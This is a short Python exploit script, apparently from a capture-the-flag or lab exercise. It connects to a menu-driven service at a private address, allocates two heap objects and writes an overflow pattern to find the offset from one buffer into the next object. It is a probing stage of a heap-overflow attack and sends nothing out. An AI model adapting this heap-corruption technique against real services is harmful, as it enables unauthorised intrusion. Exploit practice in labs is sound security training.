import socket
import time
import re

host = "10.2.0.5"
port = 10004


def recv_until(s, delim):
    data = b""
    while not data.endswith(delim):
        chunk = s.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    recv_until(s, b"> ")

    # Alloc A
    s.sendall(b"1\n")
    recv_until(s, b": ")
    s.sendall(b"32\n")
    recv_until(s, b": ")
    s.sendall(b"A\n")
    recv_until(s, b"> ")

    # Alloc B
    s.sendall(b"2\n")
    recv_until(s, b": ")  # Size
    s.sendall(b"32\n")
    recv_until(s, b": ")  # Name
    s.sendall(b"B\n")
    recv_until(s, b"> ")

    # Write A
    # Distance DataA -> ObjB should be 48
    print("Writing pattern...")
    s.sendall(b"5\n")
    recv_until(s, b": ")

    # Pattern
    # Filler (48) + P1(8) + P2(8) + P3(8) + P4(8) + P5(8) + P6(8)
    payload = b"A" * 48
    payload += b"B" * 8
    payload += b"C" * 8
    payload += b"D" * 8
    payload += b"E" * 8
    payload += b"F" * 8
    payload += b"\n"

    s.sendall(payload)
    recv_until(s, b"> ")

    # Show B
    s.sendall(b"7\n")
    out = recv_until(s, b"> ").decode(errors="ignore")
    print("Show B Output:")
    print(out)

    s.close()


if __name__ == "__main__":
    exploit()
